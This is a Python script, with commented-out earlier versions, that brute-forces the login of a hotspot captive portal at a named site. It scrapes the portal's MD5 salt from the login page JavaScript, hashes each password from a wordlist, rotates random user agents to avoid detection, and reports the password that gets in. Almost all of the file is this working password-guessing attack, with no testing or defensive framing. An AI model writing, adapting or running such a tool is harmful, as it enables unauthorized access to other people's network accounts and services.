import requests
from bs4 import BeautifulSoup
import os, re, js2py, time, random

def get_random_user_agent():
    with open("useragent.txt", "r") as useragent_file:
        useragents = useragent_file.read().splitlines()
        return random.choice(useragents)

def password_gen(data):
    path = os.path.join(os.path.dirname(__file__), "md5.js")
    md5_file = open(path, "r", encoding="utf-8")
    js = str(md5_file.read())
    js_data = js.replace('HeRe', data)
    password = js2py.eval_js(js_data)
    md5_file.close()
    return password

with open("wordlist.txt", "r") as wordlist_file:
    wordlist = wordlist_file.read().splitlines()

randomagent = get_random_user_agent()
headers = {
    "User-Agent": randomagent
}

user = input("Input user: ")
url = 'http://gardenia.com/login'
response = requests.get(url, headers=headers)
if response.status_code == 200:
    if "Please log in to use the internet hotspot service" in response.text:
        for password in wordlist:
            soup = BeautifulSoup(response.text, 'html.parser')
            script_elements = soup.find_all('script')
            for script in script_elements:
                if 'doLogin' in script.text:
                    code = script.string
                    match = re.search(r"hexMD5\('([^']+)' \+ document\.login\.password\.value \+ '([^']+)'\);", code)
                    if match:
                        password_md5 = password_gen(match.group(1) + f"{password}" + match.group(2))
                        t1 = time.time()
                        post_randomagent = get_random_user_agent()
                        post_headers = {
                            "User-Agent": post_randomagent
                        }
                        L_data = {
                            "username": user,
                            "password": password_md5,
                            "dst": "",
                            "popup": "true"
                        }
                        print(f"Trying password: {password}")
                        response = requests.post(url, data=L_data, headers=post_headers, timeout=10)
                        if "<h1>You are logged in</h1>" in response.text:
                            print(f"Success login with user {user}")
                            print(f"Password: {password}")
                            print(f"User-Agent: {post_randomagent}")
                            print(f"MD5 Hashing: {password_md5}")
                            exit()
                    else:
                        print("Could not extract MD5 calculation parts.")
                        exit(1)
        print(f"Failed trying login with user {user}")
    else:
        print("You already logged in")
        exit(1)
else:
    print('Failed to download the web page.')
    exit(1)

# # Load the wordlist from a file
# with open('wordlist.txt', 'r') as wordlist_file:
#     wordlist = wordlist_file.read().splitlines()

# # Define the username to be used in the login attempt
# user = 'B6'

# # Define the URL for the login request
# login_url = 'http://gardenia.com/login'

# # Iterate through the passwords in the wordlist
# for password in wordlist:
#     # Generate the MD5 hash for the current password
#     # hashed_password = password_gen(md5_prefix + password + '123456' + md5_suffix)
#     tes = md5_prefix + "316589" + md5_suffix
#     hashed_password = password_gen(tes)
    
#     # Prepare the POST data
#     L_data = {
#         "username": user,
#         "password": hashed_password,
#         "dst": "",
#         "popup": "true"
#     }
    
#     # Measure the time for the login attempt
#     start_time = time.time()
#     login_attempt = requests.post(login_url, data=L_data, timeout=10)
#     end_time = time.time()
#     print(login_attempt.text)
    
#     # Check if the login attempt was successful
#     if 'Login Successful' in login_attempt.text:
#         print(f'Successful login with password: {password}')
#         print(f'Time taken: {end_time - start_time} seconds')
#         break  # Exit the loop if a successful login is found

#     # Print unsuccessful attempts for debugging purposes
#     print(f'Failed login attempt with password: {password}')











































# import requests
# from bs4 import BeautifulSoup
# import re

# # URL website target
# url = 'http://gardenia.com/login'

# # Lakukan permintaan HTTP GET ke website
# response = requests.get(url)

# # Parsing HTML dengan BeautifulSoup
# soup = BeautifulSoup(response.text, 'html.parser')

# # Temukan elemen <script> yang berisi kode JavaScript dengan fungsi hexMD5()
# script_tags = soup.find_all('script')

# # Loop melalui semua script tags
# for script_tag in script_tags:
#     script_content = script_tag.string  # Menggunakan .string daripada .text

#     if script_content is not None:
#         # Cari angka-angka yang dinamis dalam fungsi hexMD5()
#         match = re.search(r'hexMD5\(\\(\d+)\' \+ document\.login\.password\.value \+ \'(\\[\d\\]+)\'\);', script_content)

#         if match:
#             first_dynamic_value = match.group(1)  # \371
#             second_dynamic_value = match.group(2)  # \135\243\047\010\227\006\345\337\123\254\377\063\200\150\351\360

#             # Ubah karakter khusus ke dalam nilai aslinya
#             first_dynamic_value = chr(int(first_dynamic_value, 8))
#             second_dynamic_value = ''.join(chr(int(val, 8)) for val in second_dynamic_value.split('\\'))

#             # Cetak hasil
#             print("Nilai Pertama:", first_dynamic_value)
#             print("Nilai Kedua:", second_dynamic_value)
#             break  # Berhenti setelah menemukan yang pertama
# else:
#     print("Script hexMD5() tidak ditemukan di dalam kode HTML.")


# from bs4 import BeautifulSoup
# import pandas as pd
# import requests, re, random, json, os

# urls = {'GARDENIA': 'http://gardenia.com/login'}

# headers = {
#     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36'
# }

# for name, url in urls.items():
#     response = requests.get(url, headers=headers)
#     if response.status_code == 200:
#         soup = BeautifulSoup(response.text, 'html.parser')
#         pretty_html = soup.prettify()
#         file_path = os.path.join('result', f'result_{name}.html')
#         with open(file_path, 'w', encoding='utf-8') as file:
#             file.write(pretty_html)
#         print("OK")